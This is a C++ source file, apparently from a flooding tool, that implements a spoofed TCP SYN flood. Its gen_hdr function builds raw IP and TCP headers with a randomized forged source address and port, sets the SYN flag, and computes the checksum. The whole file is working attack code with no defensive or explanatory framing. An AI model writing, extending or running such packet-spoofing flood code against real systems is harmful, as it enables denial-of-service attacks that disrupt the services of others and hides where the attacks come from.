#include "spoofed_tcp_flood.h"
#include "utils.h"

#include <netinet/ip.h>
#include <cstring>

spoofed_tcp_flood::spoofed_tcp_flood(std::shared_ptr<Config> config) :
                                        base_spoofed_flood(std::move(config), IPPROTO_TCP) {

}

char *spoofed_tcp_flood::gen_hdr(sockaddr_in *dst, int len) {
    char *string = new char[len];

    auto *ip = (iphdr *) string;
    auto *tcp = (tcphdr *)(string + sizeof(iphdr));
    std::string ipaddr{};
    bzero(string, len);

    ip->daddr = dst->sin_addr.s_addr;

    if(config->rand_lhost){
        utils::randomizer::randomIP(ipaddr);
        ip->saddr = inet_addr(ipaddr.c_str());
    }else{
        ip->saddr = 0;
    }

    ip->ihl = sizeof(struct iphdr) / 4;
    ip->version = 4;
    ip->tos = 16;
    ip->tot_len = htons(len);
    ip->id = utils::randomizer::randomInt(1, 1000);
    ip->frag_off = htons(0x0);
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;

    if(config->rand_lport){
        tcp->th_sport = htons(utils::randomizer::randomPort());
    }else{
        tcp->th_sport = 0;
    }

    tcp->th_dport = htons(utils::to_int(config->rport));
    tcp->th_seq = htonl(utils::randomizer::randomInt(0, 10000));
    tcp->th_ack = htonl(utils::randomizer::randomInt(0, 10000));
    tcp->th_off = sizeof(struct tcphdr) / 4;
    tcp->th_win = htons(5840);
    tcp->th_flags = TH_SYN;

    pshdr psh{};
    psh.saddr = ip->saddr;
    psh.daddr = ip->daddr;

    bcopy(tcp, &psh.tcp, sizeof(tcphdr));

    tcp->check = utils::csum((unsigned short *) &psh, sizeof(psh));


    return string;
}
